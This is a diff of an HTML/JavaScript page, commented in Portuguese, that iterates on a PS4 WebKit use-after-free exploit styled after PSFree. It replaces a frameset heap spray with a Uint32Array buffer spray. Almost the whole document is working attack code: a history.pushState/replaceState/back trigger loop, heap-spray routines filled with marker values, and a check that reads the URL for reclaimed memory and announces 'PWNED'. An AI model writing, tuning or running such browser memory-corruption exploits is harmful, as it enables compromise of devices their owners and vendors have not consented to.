@@ -1,24 +1,26 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - FastMalloc Alignment (PSFree Logic)</title>
+<title>PS4 WebKit - Raw Buffer Reclaim</title>
 <style>
-    body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #ffcc00; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #0f0; background: #050; color: #fff;
+        border: 2px solid #fc0; background: #330; color: #fff;
+        text-transform: uppercase;
     }
-    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll;}
-    .success { color: #000; background-color: #00ff00; padding: 5px; font-weight: bold;}
+    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
+    .success { color: #000; background-color: #ffcc00; padding: 5px; font-weight: bold;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - FastMalloc Reclaim (Medium Size)</h2>
-<div id="status">Baseado na análise do psfree.mjs</div>
+<h2>PS4 WebKit - Raw Buffer Reclaim (PSFree Style)</h2>
+<div id="status">Mantendo UAF original. Spray via TypedArray.</div>
 
-<button onclick="runFastMallocExploit()">INICIAR ATAQUE FASTMALLOC (20KB)</button>
+<button onclick="runRawExploit()">INICIAR RECLAIM (RAW BUFFER)</button>
 
 <div id="log"></div>
 
@@ -36,75 +38,74 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 var keepAlive = [];
 
-async function runFastMallocExploit() {
+async function runRawExploit() {
     logEl.innerHTML = "";
     keepAlive = []; 
     statusEl.innerText = "Preparando...";
 
-    // 1. PREPARAÇÃO DO SPRAY (Baseado no psfree.mjs)
-    // Estamos mirando em ~20KB. 
-    // FastMalloc aloca em potências ou blocos alinhados.
-    // 2500 vírgulas * 8 bytes = 20.000 bytes.
+    // === PREPARAÇÃO (BASEADA NO PSFREE) ===
+    // Criamos buffers brutos que não sofrem conversão de encoding.
+    // Alvo: 680.644 bytes.
+    // Uint32Array usa 4 bytes por elemento.
     
-    log("1. Pré-calculando Framesets (Target: 20KB)...");
-    let payloads = [];
+    const TARGET_BYTES = 680644;
+    const ELEMENTS = Math.floor(TARGET_BYTES / 4);
     
-    // Varredura de alinhamento: 2400 a 2600 vírgulas
-    for(let i = 2400; i < 2600; i+=8) {
-        try {
-            payloads.push(",".repeat(i));
-        } catch(e) {}
-    }
-    log(`Gerados ${payloads.length} payloads de FastMalloc.`);
+    log(`1. Preparando estratégia Raw Buffer...`);
+    log(`Alvo: ${TARGET_BYTES} bytes`);
+    log(`Elementos Uint32: ${ELEMENTS}`);
 
-    // 2. TRIGGER UAF (Reduzido para FastMalloc)
-    log("2. Disparando UAF (Tamanho Médio)...");
+    // === FASE 1: TRIGGER UAF (INTACTO COMO VOCÊ PEDIU) ===
+    log("2. Disparando UAF Original...");
     
-    // Começamos pequeno e crescemos até atingir a zona de 20KB
-    // UTF-16: 10.000 chars * 2 = 20.000 bytes
-    let size = 100;
-    const TARGET_CHARS = 10000; 
-    const STEP = 500;
+    let size = 977;
+    const STEP = 14461;
 
-    for(let i = 0; i < 60; i++) {
+    for(let i = 0; i < 48; i++) {
+        // String 'V' original
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
+        // O replaceState libera a memória anterior
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        if(i % 5 === 0) {
-            // Tenta liberar a memória
+        if(i % 6 === 0) {
+            // Gatilho assíncrono
             setTimeout(() => history.back(), 0);
         }
         
-        // Aumenta até chegar no tamanho alvo (FastMalloc range)
-        if(size < TARGET_CHARS) {
-            size += STEP;
+        // MOMENTO CRÍTICO: Na última volta, fazemos o spray IMEDIATO
+        // Sem sleep, sem espera. Velocidade pura.
+        if(i === 47) {
+            log(">>> SPRAYING RAW BUFFERS NOW <<<");
+            doRawSpray(ELEMENTS);
         } else {
-            // Quando atingirmos o tamanho ideal (20KB), fazemos o SPRAY AGRESSIVO
-            // Isso simula o comportamento do psfree que ataca blocos pequenos/médios
-            if(i % 5 === 0) {
-                 doSpray(payloads);
-                 log(`Tentativa de Reclaim no tamanho ${size} chars...`);
-            }
+            size += STEP;
+            await sleep(5);
         }
-        
-        await sleep(5);
     }
     
     await sleep(200);
 
-    // 3. VERIFICAÇÃO
+    // === FASE 3: VERIFICAÇÃO ===
     checkResult();
 }
 
-function doSpray(payloads) {
-    // Cria centenas de objetos Frameset rapidamente
-    // Isso deve preencher a "Free List" do FastMalloc
-    for(let i=0; i < 200; i++) { // Spray menor mas mais frequente
-        let idx = i % payloads.length;
-        let f = document.createElement("frameset");
-        f.rows = payloads[idx];
-        keepAlive.push(f);
+function doRawSpray(elements) {
+    // Cria 500 buffers de exatamente 680KB.
+    // Preenche com 0x41414141 ('AAAA') para ser visível na URL.
+    for(let i=0; i < 500; i++) {
+        try {
+            let buf = new Uint32Array(elements);
+            // Preenche apenas o começo para ser rápido, ou tudo se preferir robustez
+            // buf.fill(0x41414141) é mais lento, vamos preencher só cabeçalhos
+            buf[0] = 0x41414141; 
+            buf[1] = 0x42424242;
+            // Preenche o meio também, onde a URL costuma ler
+            let mid = Math.floor(elements / 2);
+            buf[mid] = 0x43434343;
+            
+            keepAlive.push(buf);
+        } catch(e) {}
     }
 }
 
@@ -114,30 +115,31 @@ function checkResult() {
     let changed = false;
     let sample = "";
     
-    // O range de busca muda pois o tamanho da URL é menor agora
-    let searchLimit = Math.min(url.length, 20000);
-
-    for(let i=100; i<searchLimit; i++) {
-        // Ignora os caracteres iniciais da URL (http...)
-        if(url.charCodeAt(i) !== 0x56 && url.charCodeAt(i) !== 0x2f && url.charCodeAt(i) !== 0x3a) {
-            // Filtro extra: psfree usa vírgulas que viram 0x00/0x01 na memória
-            // Qualquer byte baixo (0-15) é um bom sinal
-            if(url.charCodeAt(i) < 20) {
-                changed = true;
-                for(let k=0; k<16; k++) sample += url.charCodeAt(i+k).toString(16).padStart(2,'0') + " ";
-                break;
-            }
+    // Procura por qualquer byte que não seja 'V' (0x56) ou caracteres de URL normais
+    // Se o Uint32Array ocupou, veremos 'A', 'B' ou 'C' (0x41, 0x42, 0x43)
+    for(let i=1000; i<5000; i++) {
+        let c = url.charCodeAt(i);
+        if(c === 0x41 || c === 0x42 || c === 0x43) {
+            changed = true;
+            sample = "Encontrado marcador: 0x" + c.toString(16);
+            break;
+        }
+        // Backup: se qualquer coisa mudar drasticamente
+        if(c !== 0x56 && c !== 0x25) { // Ignora V e %
+             // Check visual manual no log
         }
     }
 
     if(changed) {
         log("!!! JACKPOT !!!", "success");
-        log("FastMalloc Reclaim Sucesso!");
-        log("Dados Binários: " + sample);
-        statusEl.innerText = "PWNED: FASTMALLOC";
+        log("Raw Buffer Spray funcionou!");
+        log(sample);
+        statusEl.innerText = "PWNED: RAW BUFFER";
+        statusEl.style.backgroundColor = "#ffcc00";
+        statusEl.style.color = "#000";
     } else {
         log("Falha: Ainda vendo 'V'.");
-        log("Nota: Se falhar, significa que o UAF não está ocorrendo com objetos desse tamanho.");
+        log("Nota: Tentei usar ArrayBuffer direto como o psfree.mjs faz.");
     }
 }
 </script>
